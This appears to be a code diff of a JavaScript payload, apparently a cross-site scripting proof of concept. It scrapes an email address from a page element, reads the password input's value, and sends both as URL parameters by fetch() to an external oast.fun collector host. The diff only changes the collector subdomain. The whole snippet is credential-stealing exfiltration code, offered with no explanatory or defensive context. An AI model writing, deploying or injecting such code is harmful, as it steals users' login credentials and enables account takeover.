@@ -3,7 +3,7 @@ var email = document.querySelector('.sc-gwxIzh.jVmVMn').textContent.match(/\S+@\
 var pass = document.querySelector('input[type="password"]').value;
 
 // Construct the URL with parameters
-var url = `https://yywufyeyfsciioyphurd3ulkjfsby8vrn.oast.fun?email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`;
+var url = `http://xrigogeqptmvmfrjfmuie7fmcag3sb606.oast.fun/?email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`;
 
 // Send the GET request
 fetch(url)
